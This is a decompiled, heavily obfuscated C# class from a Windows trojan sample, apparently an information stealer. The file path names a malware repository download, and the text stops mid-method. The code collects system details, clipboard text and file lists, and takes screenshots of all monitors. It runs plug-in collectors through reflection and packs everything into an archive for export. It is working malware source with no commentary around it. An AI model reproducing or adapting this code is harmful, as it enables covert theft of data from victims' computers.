// Decompiled with JetBrains decompiler
// Type: @Ԙ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using sfEQeQAzPkGgSGbaUci;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

internal sealed class \u0040Ԙ
{
  internal List<string> \u0040ӓ;
  internal object \u0040Ӕ;
  internal bool \u0040ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public byte[] \u0040Ӗ(Dictionary<string, object> _param1, bool _param2, \u0040Ԫ _param3)
  {
    \u0040Ԙ.\u0040ӓ ӓ = new \u0040Ԙ.\u0040ӓ();
    ӓ.\u0040ӓ = (object) this;
    ӓ.\u0040Ӕ = _param3;
    ӓ.\u0040ӕ = _param1;
    this.\u0040ӕ = _param2;
    byte[] numArray = (byte[]) null;
    ӓ.\u0040Ӗ = new Dictionary<string, object>();
    ӓ.\u0040Ә = (object) new Stopwatch();
    ((Stopwatch) ӓ.\u0040Ә).Start();
    using (MemoryStream memoryStream = new MemoryStream())
    {
      \u0040Ս ս = new \u0040Ս(Encoding.UTF8);
      ս.\u0040Ԭ(\u0040շ.\u0040ӻ(555662) + (string) \u0040ԑ.\u0040ӕ + \u0040շ.\u0040ӻ(3078) + DateTime.Now.ToString(\u0040շ.\u0040ӻ(555686)));
      ս.\u0040Ԩ((I6IRgTAB68kRKW00LfL) 5);
      this.\u0040Ӕ = (object) ս;
      Task.WaitAll(Task.Factory.StartNew(new Action(ӓ.\u0040ӝ)), Task.Factory.StartNew(new Action(ӓ.\u0040Ӡ)), Task.Factory.StartNew(new Action(ӓ.\u0040ӡ)), Task.Factory.StartNew(new Action(ӓ.\u0040ӣ)));
      \u0040ԝ.\u0040Օ(this, \u0040շ.\u0040ӻ(555710));
      foreach (KeyValuePair<string, object> keyValuePair in ӓ.\u0040Ӗ)
        \u0040ԝ.\u0040Օ(this, \u0040շ.\u0040ӻ(555744) + keyValuePair.Key + \u0040շ.\u0040ӻ(555752) + keyValuePair.Value.ToString());
      \u0040ԝ.\u0040Օ(this, \u0040շ.\u0040ӻ(555762));
      \u0040ԝ.\u0040۴(this, \u0040շ.\u0040ӻ(555796), Encoding.UTF8.GetBytes(string.Join(\u0040շ.\u0040ӻ(3078), (IEnumerable<string>) this.\u0040ӓ)));
      \u0040ԝ.\u0040ڬ((\u0040Ս) this.\u0040Ӕ, (Stream) memoryStream);
      numArray = memoryStream.ToArray();
    }
    ((Stopwatch) ӓ.\u0040Ә).Stop();
    ӓ.\u0040ӗ = (object) string.Join(\u0040շ.\u0040ӻ(3078), (IEnumerable<string>) this.\u0040ӓ);
    new Thread(new ThreadStart(ӓ.\u0040Ӥ)).Start();
    \u0040ԝ.\u0040ڲ(this, \u0040շ.\u0040ӻ(555818) + ((Stopwatch) ӓ.\u0040Ә).Elapsed.ToString(), ӓ.\u0040Ӕ);
    return numArray;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  void object.vVN()
  {
    try
    {
      \u0040Ԙ.\u0040ӗ((object) this.\u0040ӓ);
      \u0040Ԙ.\u0040Ӛ();
      int num;
      if (!\u0040Ԙ.\u0040ӛ())
        num = 2;
      else
        goto label_6;
label_5:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            this.\u0040ӓ = (List<string>) null;
            break;
          case 4:
            goto label_8;
        }
        \u0040Ԙ.\u0040Ә(this.\u0040Ӕ);
        num = 4;
      }
label_8:
      return;
label_6:
      num = 3;
      if (!\u0040Ԙ.\u0040ӛ())
        goto label_5;
    }
    finally
    {
      \u0040Ԙ.\u0040ә((object) this);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ԙ()
  {
    int num = 5;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 3:
          this.\u0040ӕ = false;
          goto case 1;
        case 1:
        case 4:
          \u0040Ԙ.\u0040ӝ((object) this);
          num = 7;
          continue;
        case 2:
          this.\u0040Ӕ = (object) null;
          goto default;
        case 5:
          \u0040Ԙ.\u0040Ӝ();
          num = 6;
          continue;
        case 6:
          this.\u0040ӓ = new List<string>();
          num = 2;
          continue;
        case 7:
          goto label_3;
        default:
          \u0040Ԙ.\u0040ӛ();
          if (!\u0040Ԙ.\u0040Ӛ())
          {
            num = 1;
            continue;
          }
          if (true)
          {
            num = 0;
            continue;
          }
          goto case 1;
      }
    }
label_3:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӗ(object _param0) => ((List<string>) _param0).Clear();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ә(object _param0) => ((\u0040Ս) _param0).\u0023Nn();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0) => __nonvirtual (_param0.Finalize());

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӝ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӝ(object _param0) => _param0.\u002Ector();

  private sealed class \u0040ӓ
  {
    public object \u0040ӓ;
    public \u0040Ԫ \u0040Ӕ;
    public Dictionary<string, object> \u0040ӕ;
    public Dictionary<string, object> \u0040Ӗ;
    public object \u0040ӗ;
    public object \u0040Ә;
    public Action<object[]> \u0040ә;
    public Action<object[]> \u0040Ӛ;
    public object \u0040ӛ;
    public Action<object[]> \u0040Ӝ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040Ԙ.\u0040ӓ.\u0040Ӧ();
      \u0040Ԙ.\u0040ӓ.\u0040ӧ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӝ()
    {
      try
      {
        \u0040Ԙ.\u0040Ӕ ӕ = new \u0040Ԙ.\u0040Ӕ();
        ӕ.\u0040ӗ = (object) this;
        int num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
              \u0040Ԙ.\u0040ӓ.\u0040Ӯ(\u0040Ԙ.\u0040ӓ.\u0040ӭ((object) ӕ.\u0040ӓ));
              num1 = 9;
              continue;
            case 1:
              ӕ.\u0040ӓ = new List<Task>();
              num1 = 8;
              continue;
            case 2:
            case 3:
              ӕ.\u0040Ӗ = \u0040Ԙ.\u0040ӓ.\u0040Ӫ((object) \u0040Ԓ.\u0040Ӗ);
              int num2 = 4;
              num1 = \u0040Ԙ.\u0040ӓ.\u0040ө() ? num2 : num2;
              continue;
            case 4:
              ӕ.\u0040Ӕ = new object();
              goto case 7;
            case 5:
            case 6:
              \u0040Ԓ.\u0040Ӗ.ForEach(new Action<object[]>(ӕ.\u0040Ә));
              num1 = 0;
              continue;
            case 7:
              \u0040ԝ.\u0040ڲ((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040Ӭ((object) new string[5]
              {
                (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(555862),
                ӕ.\u0040ӕ.ToString(),
                (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(555922),
                ӕ.\u0040Ӗ.ToString(),
                (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(555928)
              }), this.\u0040Ӕ);
              goto case 5;
            case 8:
              ӕ.\u0040ӕ = 0;
              num1 = !\u0040Ԙ.\u0040ӓ.\u0040Ө() ? 6 : 3;
              continue;
            case 9:
              goto label_12;
            default:
              num1 = 7;
              continue;
          }
        }
      }
      catch
      {
      }
label_12:
      try
      {
        \u0040Ԓ.\u0040Ә.ForEach(this.\u0040Ӛ ?? (this.\u0040Ӛ = new Action<object[]>(this.\u0040ӟ)));
        \u0040ԝ.\u0040ڲ((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(555940), this.\u0040Ӕ);
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӟ(object[] _param1) => \u0040ԝ.\u0040۴((\u0040Ԙ) this.\u0040ӓ, (string) _param1[0], (byte[]) _param1[1]);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӟ(object[] _param1)
    {
      try
      {
        foreach (KeyValuePair<string, object> keyValuePair in (Dictionary<string, object>) \u0040Ԙ.\u0040ӓ.\u0040ӯ((object) (MethodInfo) _param1[0], _param1[1], (object) null))
        {
          Dictionary<string, object> ӗ = this.\u0040Ӗ;
          bool lockTaken = false;
          try
          {
            Monitor.Enter((object) ӗ, ref lockTaken);
            \u0040Ԙ.\u0040ӓ.\u0040Ө();
            int num = \u0040Ԙ.\u0040ӓ.\u0040ө() ? 2 : 3;
            bool flag;
            while (true)
            {
              switch (num)
              {
                case 0:
                case 3:
                  flag = !this.\u0040Ӗ.ContainsKey(keyValuePair.Key);
                  goto case 1;
                case 1:
                case 2:
                  if (!flag)
                    goto label_13;
                  else
                    goto case 4;
                case 4:
                  this.\u0040Ӗ.Add(keyValuePair.Key, keyValuePair.Value);
                  num = 5;
                  continue;
                case 5:
                  goto label_13;
                default:
                  num = 4;
                  continue;
              }
            }
          }
          finally
          {
            if (lockTaken)
              \u0040Ԙ.\u0040ӓ.\u0040Ӱ((object) ӗ);
          }
label_13:;
        }
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӡ()
    {
      try
      {
        if (!(bool) this.\u0040ӕ[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556006)])
          return;
        \u0040ԝ.\u0040Օ((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556024));
        string str1 = string.Empty;
        try
        {
          try
          {
            // ISSUE: type reference
            \u0040Ԙ.\u0040ӓ.\u0040Ӳ((object) \u0040Ԙ.\u0040ӓ.\u0040ӱ(__typeref (Screen)).GetField((string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556110), BindingFlags.Static | BindingFlags.NonPublic), (object) null, (object) null);
          }
          catch
          {
          }
          foreach (Screen screen in (Screen[]) \u0040Ԙ.\u0040ӓ.\u0040ӳ())
          {
            try
            {
              str1 = (string) \u0040Ԙ.\u0040ӓ.\u0040Ӭ((object) new string[7]
              {
                str1,
                (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(3078),
                (string) \u0040Ԙ.\u0040ӓ.\u0040Ӵ((object) screen),
                (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556128),
                \u0040Ԙ.\u0040ӓ.\u0040ӵ((object) screen).Width.ToString(),
                (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556138),
                \u0040Ԙ.\u0040ӓ.\u0040ӵ((object) screen).Height.ToString()
              });
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        Dictionary<string, object> dictionary = \u0040ԝ.\u0040ԋ();
        string str2 = (string) \u0040Ԙ.\u0040ӓ.\u0040Ӭ((object) new string[38]
        {
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556144),
          \u0040ԝ.\u0040۸(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556938),
          \u0040ԝ.\u0040ب(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556968),
          (string) \u0040Ԙ.\u0040ӓ.\u0040Ӷ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556994),
          \u0040ԝ.\u0040\u05FF(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557022),
          \u0040ԝ.\u0040ښ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557050),
          \u0040ԝ.\u0040\u05FA(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557070),
          \u0040ԝ.\u0040ܸ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557092),
          \u0040ԝ.\u0040ԏ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557122),
          \u0040ԝ.\u0040ه(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557150),
          \u0040ԝ.\u0040ޗ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557184),
          \u0040ԝ.\u0040ڸ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557202),
          \u0040ԝ.\u0040Ӯ(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557258),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӷ(\u0040ԑ.\u0040ӓ),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557278),
          dictionary[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557298)]?.ToString(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557306),
          dictionary[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557326)]?.ToString(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557338),
          dictionary[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557374)]?.ToString(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557392),
          dictionary[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557420)]?.ToString(),
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557430),
          str1,
          (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557462),
          \u0040Ԙ.\u0040ӓ.\u0040Ӹ().ToString((string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557496))
        });
        \u0040ԝ.\u0040۴((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӹ(\u0040Ԙ.\u0040ӓ.\u0040ӫ(557532), (object) string.Join<object>((string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557562), ((IEnumerable<object>) new object[2]
        {
          dictionary[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557374)],
          dictionary[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557326)]
        }).ToList<object>().Where<object>(\u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.chDAf2iNqw ?? (\u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.chDAf2iNqw = new Func<object, bool>(((\u0040Ԙ.JTH8NFKtI4P0aeV3Vqq) \u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.wwZApPnf5e).Nn5AamJXwh)))), \u0040Ԙ.\u0040ӓ.\u0040ӫ(557570)), (byte[]) \u0040Ԙ.\u0040ӓ.\u0040ӻ(\u0040Ԙ.\u0040ӓ.\u0040Ӻ(), (object) str2));
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӡ()
    {
      int num = 5;
      while (true)
      {
        ThreadStart threadStart;
        Thread thread;
        bool flag;
        object start;
        switch (num)
        {
          case 0:
            \u0040ԝ.\u0040Օ((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557584));
            goto case 3;
          case 1:
          case 4:
            if (flag)
            {
              if (!\u0040Ԙ.\u0040ӓ.\u0040ө())
              {
                num = 0;
                continue;
              }
              goto case 6;
            }
            else
              goto label_13;
          case 2:
            \u0040Ԙ.\u0040ӓ.\u0040Ӽ((object) thread, ApartmentState.STA);
            num = 9;
            continue;
          case 3:
          case 7:
            start = this.\u0040ӛ;
            if (start == null)
            {
              num = 8;
              continue;
            }
            break;
          case 5:
            flag = (bool) this.\u0040ӕ[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(3584)];
            \u0040Ԙ.\u0040ӓ.\u0040ө();
            if (\u0040Ԙ.\u0040ӓ.\u0040Ө())
            {
              if (!\u0040Ԙ.\u0040ӓ.\u0040ө())
              {
                num = 4;
                continue;
              }
              goto case 1;
            }
            else
            {
              num = 7;
              continue;
            }
          case 6:
            \u0040Ԙ.\u0040ӓ.\u0040Ӿ((object) thread, 3000);
            num = 11;
            continue;
          case 8:
            this.\u0040ӛ = (object) (threadStart = new ThreadStart(this.\u0040Ӣ));
            goto case 10;
          case 9:
            \u0040Ԙ.\u0040ӓ.\u0040ӽ((object) thread);
            if (true)
            {
              num = 6;
              continue;
            }
            goto case 3;
          case 10:
            start = (object) threadStart;
            break;
          case 11:
            goto label_18;
          default:
            if (!\u0040Ԙ.\u0040ӓ.\u0040ө())
            {
              num = 10;
              continue;
            }
            goto case 0;
        }
        thread = new Thread((ThreadStart) start);
        num = 2;
      }
label_13:
      return;
label_18:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӣ()
    {
      try
      {
        bool flag1 = \u0040Ԙ.\u0040ӓ.\u0040ӿ();
        int num1 = 8;
        if (true)
          goto label_7;
label_2:
        bool flag2;
        if (flag1)
        {
          if (\u0040Ԙ.\u0040ӓ.\u0040Ө())
            num1 = 9;
          else if (true)
            num1 = 5;
          else
            goto label_14;
        }
        else
        {
          flag2 = \u0040Ԙ.\u0040ӓ.\u0040Ԃ();
          goto label_14;
        }
label_7:
        bool flag3;
        StringCollection source;
        while (true)
        {
          switch (num1)
          {
            case 0:
              if (!flag3)
              {
                \u0040ԝ.\u0040۴((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557654), (byte[]) \u0040Ԙ.\u0040ӓ.\u0040ӻ(\u0040Ԙ.\u0040ӓ.\u0040Ӻ(), \u0040Ԙ.\u0040ӓ.\u0040ԁ(\u0040Ԙ.\u0040ӓ.\u0040ӫ(3078), (object) source.Cast<string>().ToArray<string>())));
                int num2 = 4;
                num1 = \u0040Ԙ.\u0040ӓ.\u0040ө() ? num2 : num2;
                continue;
              }
              goto label_12;
            case 1:
            case 9:
              source = (StringCollection) \u0040Ԙ.\u0040ӓ.\u0040Ԁ();
              num1 = 7;
              continue;
            case 2:
              \u0040ԝ.\u0040۴((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557700), (byte[]) \u0040Ԙ.\u0040ӓ.\u0040ӻ(\u0040Ԙ.\u0040ӓ.\u0040Ӻ(), \u0040Ԙ.\u0040ӓ.\u0040ԃ(TextDataFormat.UnicodeText)));
              num1 = 10;
              continue;
            case 3:
              goto label_18;
            case 4:
              goto label_22;
            case 5:
            case 6:
              goto label_14;
            case 7:
              flag3 = source == null;
              num1 = 0;
              continue;
            case 8:
              goto label_2;
            case 10:
              goto label_20;
            default:
              num1 = 3;
              continue;
          }
        }
label_12:
        return;
label_18:
        return;
label_22:
        return;
label_20:
        return;
label_14:
        if (!flag2)
          return;
        if (false)
          return;
        num1 = 2;
        goto label_7;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӣ()
    {
      try
      {
        if (!(bool) this.\u0040ӕ[(string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557744)])
          return;
        List<string> values = new List<string>();
        try
        {
          // ISSUE: type reference
          \u0040Ԙ.\u0040ӓ.\u0040Ӳ((object) \u0040Ԙ.\u0040ӓ.\u0040ӱ(__typeref (Screen)).GetField((string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(556110), BindingFlags.Static | BindingFlags.NonPublic), (object) null, (object) null);
        }
        catch
        {
        }
        foreach (Screen screen in (Screen[]) \u0040Ԙ.\u0040ӓ.\u0040ӳ())
        {
          values.Add((string) \u0040Ԙ.\u0040ӓ.\u0040Ӵ((object) screen));
          \u0040Ԛ ԛ = new \u0040Ԛ();
          \u0040ԝ.\u0040ڀ((string) \u0040Ԙ.\u0040ӓ.\u0040Ӵ((object) screen), ԛ);
          \u0040ԝ.\u0040۴((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040ӹ(\u0040Ԙ.\u0040ӓ.\u0040ӫ(557768), \u0040Ԙ.\u0040ӓ.\u0040Ԅ(\u0040Ԙ.\u0040ӓ.\u0040Ӵ((object) screen), \u0040Ԙ.\u0040ӓ.\u0040ӫ(557818), (object) ""), \u0040Ԙ.\u0040ӓ.\u0040ӫ(557830)), \u0040ԝ.\u0040\u0701(ԛ, true));
          \u0040Ԙ.\u0040ӓ.\u0040ԅ((object) ԛ);
        }
        \u0040ԝ.\u0040Օ((\u0040Ԙ) this.\u0040ӓ, (string) \u0040Ԙ.\u0040ӓ.\u0040Ԇ(\u0040Ԙ.\u0040ӓ.\u0040ӫ(557842), (object) \u0040Ԙ.\u0040ӓ.\u0040ӳ().Length.ToString(), \u0040Ԙ.\u0040ӓ.\u0040ӫ(557920), (object) string.Join((string) \u0040Ԙ.\u0040ӓ.\u0040ӫ(557952), (IEnumerable<string>) values)));
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӥ()
    {
      try
      {
        \u0040Ԓ.\u0040ӗ.ForEach(this.\u0040Ӝ ?? (this.\u0040Ӝ = new Action<object[]>(this.\u0040ӥ)));
      }
      catch
      {
      }
      this.\u0040ӗ = (object) null;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӥ(object[] _param1)
    {
      try
      {
        \u0040Ԙ.\u0040ӓ.\u0040ӯ((object) (MethodInfo) _param1[0], _param1[1], (object) new object[4]
        {
          this.\u0040ӗ,
          (object) \u0040Ԙ.\u0040ӓ.\u0040ԇ(this.\u0040Ә),
          (object) 24495,
          (object) this.\u0040Ӗ
        });
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӧ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӧ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ө() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ө() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ӫ(object _param0) => ((List<object[]>) _param0).Count;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӫ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӭ(object _param0) => (object) string.Concat((string[]) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӭ(object _param0) => (object) ((List<Task>) _param0).ToArray();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӯ(object _param0) => Task.WaitAll((Task[]) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӯ(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӱ(object _param0) => Monitor.Exit(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static System.Type \u0040ӱ(RuntimeTypeHandle _param0) => System.Type.GetTypeFromHandle(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӳ(object _param0, object _param1, object _param2) => ((FieldInfo) _param0).SetValue(_param1, _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӳ() => (object) Screen.AllScreens;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӵ(object _param0) => (object) ((Screen) _param0).DeviceName;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static Rectangle \u0040ӵ(object _param0) => ((Screen) _param0).Bounds;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӷ() => (object) \u0040Ԣ.\u0040ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӷ(object _param0) => (object) Path.GetDirectoryName((string) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static DateTime \u0040Ӹ() => DateTime.Now;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӹ(object _param0, object _param1, object _param2) => (object) ((string) _param0 + (string) _param1 + (string) _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӻ() => (object) Encoding.UTF8;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӻ(object _param0, object _param1) => (object) ((Encoding) _param0).GetBytes((string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӽ(object _param0, ApartmentState _param1) => ((Thread) _param0).SetApartmentState(_param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӽ(object _param0) => ((Thread) _param0).Start();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӿ(object _param0, int _param1) => ((Thread) _param0).Join(_param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӿ() => Clipboard.ContainsFileDropList();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ԁ() => (object) Clipboard.GetFileDropList();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ԁ(object _param0, object _param1) => (object) string.Join((string) _param0, (string[]) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ԃ() => Clipboard.ContainsText();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ԃ(TextDataFormat _param0) => (object) Clipboard.GetText(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ԅ(object _param0, object _param1, object _param2) => (object) ((string) _param0).Replace((string) _param1, (string) _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ԅ(object _param0) => ((\u0040Ԛ) _param0).\u0023Nn();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ԇ(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static TimeSpan \u0040ԇ(object _param0) => ((Stopwatch) _param0).Elapsed;
  }

  private sealed class \u0040Ӕ
  {
    public List<Task> \u0040ӓ;
    public object \u0040Ӕ;
    public int \u0040ӕ;
    public int \u0040Ӗ;
    public object \u0040ӗ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040Ӕ()
    {
      \u0040Ԙ.\u0040Ӕ.\u0040ә();
      \u0040Ԙ.\u0040Ӕ.\u0040Ӛ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ә(object[] _param1)
    {
      int num = 3;
      \u0040Ԙ.\u0040ӕ ӕ;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            ӕ.\u0040ӓ = (object) _param1;
            goto case 4;
          case 1:
          case 5:
            ӕ.\u0040Ӕ = (object) this;
            goto case 0;
          case 3:
            ӕ = new \u0040Ԙ.\u0040ӕ();
            \u0040Ԙ.\u0040Ӕ.\u0040Ӝ();
            if (\u0040Ԙ.\u0040Ӕ.\u0040ӛ())
            {
              if (true)
              {
                num = 5;
                continue;
              }
              goto case 1;
            }
            else
            {
              if (\u0040Ԙ.\u0040Ӕ.\u0040ӛ())
              {
                num = 0;
                continue;
              }
              goto label_10;
            }
          case 4:
            this.\u0040ӓ.Add((Task) \u0040Ԙ.\u0040Ӕ.\u0040Ӟ(\u0040Ԙ.\u0040Ӕ.\u0040ӝ(), (object) new Action(ӕ.\u0040ӕ)));
            if (\u0040Ԙ.\u0040Ӕ.\u0040ӛ())
            {
              num = 6;
              continue;
            }
            goto case 3;
          case 6:
            goto label_8;
          default:
            num = 4;
            continue;
        }
      }
label_8:
      return;
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ә() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӛ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӛ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӝ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӝ() => (object) Task.Factory;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӟ(object _param0, object _param1) => (object) ((TaskFactory) _param0).StartNew((Action) _param1);
  }

  private sealed class \u0040ӕ
  {
    public object \u0040ӓ;
    public object \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӕ()
    {
      \u0040Ԙ.\u0040ӕ.\u0040Ӗ();
      \u0040Ԙ.\u0040ӕ.\u0040ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӕ()
    {
      try
      {
        object ӓ = ((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040ӓ;
        string[] strArray = new string[5]
        {
          (string) \u0040Ԙ.\u0040ӕ.\u0040Ӛ(557962),
          null,
          null,
          null,
          null
        };
        int num1 = this.\u0040ӓ[1].GetType().GetHashCode();
        strArray[1] = num1.ToString();
